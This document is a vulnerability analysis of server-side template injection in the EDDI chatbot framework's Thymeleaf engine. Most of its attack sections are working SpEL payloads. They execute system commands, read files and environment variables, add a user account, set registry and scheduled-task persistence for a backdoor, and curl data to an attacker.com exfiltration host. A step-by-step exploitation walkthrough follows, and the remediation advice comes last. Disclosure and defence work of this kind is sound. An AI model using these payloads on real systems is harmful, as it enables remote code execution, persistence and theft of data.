# Server-Side Template Injection (SSTI) Vulnerability Analysis - EDDI Chatbot Framework

## Executive Summary

The EDDI chatbot framework contains critical Server-Side Template Injection (SSTI) vulnerabilities in its Thymeleaf templating engine implementation. User-controlled input flows directly into template processing without proper sanitization, enabling remote code execution through malicious Thymeleaf expressions.

## Vulnerability Overview

### Root Cause Analysis

1. **Direct User Input Processing**: The `TemplatingEngine.processTemplate()` method processes user-controlled context data directly through Thymeleaf templates
2. **Insufficient Input Sanitization**: User input from conversation memory is inserted into template contexts without validation
3. **Powerful Expression Language**: Thymeleaf's Spring Expression Language (SpEL) provides access to Java runtime methods
4. **Multiple Injection Points**: Various components accept user input that flows into template processing

### Technical Details

**Vulnerable Code Path:**
```
User Input → ConversationMemory → OutputTemplateTask → TemplatingEngine.processTemplate() → Thymeleaf Template → Code Execution
```

**Key Vulnerable Files:**
- `src/main/java/ai/labs/eddi/modules/templating/impl/TemplatingEngine.java`
- `src/main/java/ai/labs/eddi/modules/templating/OutputTemplateTask.java`
- `src/main/java/ai/labs/eddi/engine/memory/ConversationMemoryUtilities.java`

## SSTI Payload Construction

### 1. Basic Code Execution Payloads

#### System Command Execution
```thymeleaf
${T(java.lang.Runtime).getRuntime().exec('calc.exe')}
${T(java.lang.Runtime).getRuntime().exec('cmd /c dir')}
${T(java.lang.Runtime).getRuntime().exec('powershell -c Get-Process')}
```

#### File System Access
```thymeleaf
${T(java.nio.file.Files).readString(T(java.nio.file.Paths).get('C:\\Windows\\System32\\drivers\\etc\\hosts'))}
${T(java.io.File).new('C:\\temp\\malicious.txt').createNewFile()}
```

#### Environment Variable Disclosure
```thymeleaf
${T(java.lang.System).getenv()}
${T(java.lang.System).getProperty('user.dir')}
${T(java.lang.System).getProperty('java.version')}
```

### 2. Advanced Exploitation Techniques

#### Multi-Stage Payload Execution
```thymeleaf
${T(java.lang.Class).forName('java.lang.Runtime').getMethod('getRuntime').invoke(null).exec('cmd /c echo stage1 && echo stage2')}
```

#### Reflection-Based Code Execution
```thymeleaf
${T(java.lang.Thread).currentThread().getContextClassLoader().loadClass('java.lang.Runtime').getMethod('getRuntime').invoke(null).exec('notepad.exe')}
```

#### Process Builder for Complex Commands
```thymeleaf
${T(java.lang.ProcessBuilder).new({'cmd','/c','whoami'}).start()}
${T(java.lang.ProcessBuilder).new({'powershell','-c','Get-ComputerInfo'}).start()}
```

### 3. Context-Specific Injection Vectors

#### Chat Interface Context Variables
```javascript
// Injected through chat-base.js user input
{
  "userInput": "${T(java.lang.Runtime).getRuntime().exec('calc.exe')}",
  "context": {
    "malicious": "*{T(java.lang.System).exit(0)}"
  }
}
```

#### Quick Reply Template Injection
```thymeleaf
th:text="${T(java.lang.Runtime).getRuntime().exec('cmd /c type C:\\sensitive.txt')}"
```

#### HTTP Calls Task Template
```thymeleaf
#{T(java.lang.Runtime).getRuntime().exec('curl -X POST http://attacker.com/exfiltrate -d @C:\\data.txt')}
```

## Attack Vector Documentation

### Vector 1: Conversation Memory Context Injection

**Entry Point**: User message input through chat interface
**Flow**: 
1. User sends malicious message containing Thymeleaf expressions
2. Message stored in ConversationMemory
3. OutputTemplateTask processes message through TemplatingEngine
4. Malicious expressions executed during template rendering

**Example Attack:**
```json
{
  "message": "Hello ${T(java.lang.Runtime).getRuntime().exec('cmd /c net user attacker password123 /add')}"
}
```

### Vector 2: Bot Package Template Injection

**Entry Point**: Malicious bot packages uploaded to system
**Flow**:
1. Attacker creates bot package with malicious templates
2. Package contains Thymeleaf templates with embedded expressions
3. Bot execution triggers template processing
4. Malicious code executes with system privileges

**Example Malicious Template:**
```html
<div th:text="${T(java.lang.Runtime).getRuntime().exec('cmd /c reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /d C:\\malware.exe')}">
  Loading...
</div>
```

### Vector 3: Context Variable Manipulation

**Entry Point**: API endpoints accepting context data
**Flow**:
1. Attacker sends crafted API requests with malicious context
2. Context data flows into template processing
3. JsonSerializationThymeleafDialect processes malicious expressions
4. Code execution occurs during serialization

**Example API Payload:**
```json
{
  "context": {
    "data": "@{T(java.lang.Runtime).getRuntime().exec('cmd /c schtasks /create /tn Persistence /tr C:\\backdoor.exe /sc onlogon')}"
  }
}
```

## Exploitation Demonstration

### Step 1: Identify Injection Point
1. Access chat interface at `http://localhost:7070`
2. Send test message with basic Thymeleaf expression: `${7*7}`
3. If response shows `49`, SSTI vulnerability confirmed

### Step 2: Escalate to Code Execution
1. Send payload: `${T(java.lang.Runtime).getRuntime().exec('calc.exe')}`
2. Calculator application should launch on server
3. Confirms remote code execution capability

### Step 3: Data Exfiltration
1. Send payload: `${T(java.nio.file.Files).readString(T(java.nio.file.Paths).get('C:\\Windows\\System32\\drivers\\etc\\hosts'))}`
2. System hosts file contents returned in response
3. Demonstrates sensitive file access

### Step 4: Persistence Establishment
1. Send payload: `${T(java.lang.Runtime).getRuntime().exec('cmd /c reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /d C:\\backdoor.exe')}`
2. Registry entry created for persistence
3. Backdoor will execute on system restart

## Impact Assessment

### Severity: CRITICAL (CVSS 9.8)

**Attack Vector**: Network
**Attack Complexity**: Low
**Privileges Required**: None
**User Interaction**: None
**Scope**: Changed
**Confidentiality Impact**: High
**Integrity Impact**: High
**Availability Impact**: High

### Potential Attack Scenarios

1. **Remote Code Execution**: Immediate system compromise
2. **Data Exfiltration**: Access to sensitive files and data
3. **Lateral Movement**: Use compromised system as pivot point
4. **Denial of Service**: System shutdown or resource exhaustion
5. **Persistence**: Install backdoors and maintain access
6. **Privilege Escalation**: Exploit system services for higher privileges

## Recommendations

### Immediate Actions Required

1. **Disable Template Processing**: Temporarily disable Thymeleaf template processing for user input
2. **Input Validation**: Implement strict input sanitization and validation
3. **Access Controls**: Restrict template engine access to trusted sources only
4. **Security Monitoring**: Deploy monitoring for template injection attempts

### Long-term Security Improvements

1. **Template Sandboxing**: Implement restricted execution environment for templates
2. **Expression Whitelisting**: Allow only safe Thymeleaf expressions
3. **Context Sanitization**: Sanitize all user-controlled data before template processing
4. **Regular Security Audits**: Conduct periodic SSTI vulnerability assessments

### Code-Level Mitigations

1. **Input Filtering**: Remove or escape Thymeleaf control characters
2. **Context Isolation**: Separate user data from template execution context
3. **Safe Template APIs**: Use safer template processing methods
4. **Expression Restrictions**: Disable dangerous Thymeleaf features

## Testing Methodology

### Automated Testing
- Use SSTI scanner tools to identify injection points
- Implement regression tests for template processing security
- Regular vulnerability scanning of template components

### Manual Testing
- Code review of template processing logic
- Penetration testing of chat interface
- Security assessment of bot package handling

## Conclusion

The EDDI chatbot framework contains severe SSTI vulnerabilities that enable remote code execution with minimal effort from attackers. Immediate remediation is required to prevent system compromise and data breaches. The combination of powerful templating features and insufficient input validation creates a critical security risk that must be addressed through comprehensive security controls and architectural changes.
